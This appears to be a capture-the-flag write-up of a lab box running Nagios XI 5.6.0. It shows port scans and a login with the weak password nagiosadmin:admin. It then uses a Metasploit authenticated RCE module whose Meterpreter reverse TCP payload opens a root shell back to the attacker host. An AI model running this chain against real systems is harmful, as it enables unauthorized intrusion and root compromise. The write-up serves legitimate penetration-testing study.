---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/monitoring-1,555/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery
## port scan
```bash
$ nmap -Pn -p- 192.168.198.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-22 16:42 EST
Nmap scan report for 192.168.198.136
Host is up (0.026s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.19 seconds

$ nmap -Pn -p22,25,80,389,443,5667 -sV 192.168.198.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-22 16:43 EST
Nmap scan report for 192.168.198.136
Host is up (0.14s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
5667/tcp open  tcpwrapped
Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds
```

## port 80 and 443 (web server)
A `nagios` is running here.

![nagios]((/images/monitoring_nagios.png))

--- 

# exploitation
## default password
Googling for default credentials online reveals that the default username for `nagios` is `nagiosadmin`.

![nagios default credentials]((/images/monitoring_nagiosdefaultcreds.png))

> Unfortunately the default credentials do not work.
{: .prompt-danger }

Lets check if user `nagiosadmin` may used another weak password.

![nagios logged in](/images/monitoring_nagiosloggedin.png)

> Checking `nagiosadmin:admin` as credentials works!
> The screenshot reveals that `nagios xi 5.6.0` is installed.
{: .prompt-info }

## finding an exploit
Looking in `metasploit` shows 2 different potential authenticated remote code executions.

```bash
msf6 exploit(multi/handler) > search nagios xi 5.6

Matching Modules
================

   #  Name                                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                                 ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_mibs_authenticated_rce                  2020-10-20       excellent  Yes    Nagios XI 5.6.0-5.7.3 - Mibs.php Authenticated Remote Code Exection
   1  exploit/linux/http/nagios_xi_magpie_debug                            2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   2  exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce  2019-07-29       excellent  Yes    Nagios XI Prior to 5.6.6 getprofile.sh Authenticated Remote Command Execution


Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
```

Lets check `exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`.

## exploit it
```bash
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > options

Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  false            no        If the Nagios XI installation has not been completed, try to do so. This includes signing the license agreement.
   PASSWORD        admin            yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          192.168.198.136  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.49.198   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)

msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.49.198:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.0
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the plugin to request the final payload...
[*] Sending stage (3012548 bytes) to 192.168.198.136
[*] Meterpreter session 2 opened (192.168.49.198:4444 -> 192.168.198.136:35670 ) at 2022-11-22 17:13:36 -0500
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > getuid
Server username: root
```

> It worked and we got a `root` shell!
{: .prompt-info }

---

# post exploitation
## get the flag
```bash
meterpreter > shell
Process 15081 created.
Channel 1 created.
ls
CHANGES.txt
getprofile.sh
profile.inc.php
profile.php
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
proof.txt
scripts
cat proof.txt
2******************************2
```

Pwned! <@:-)
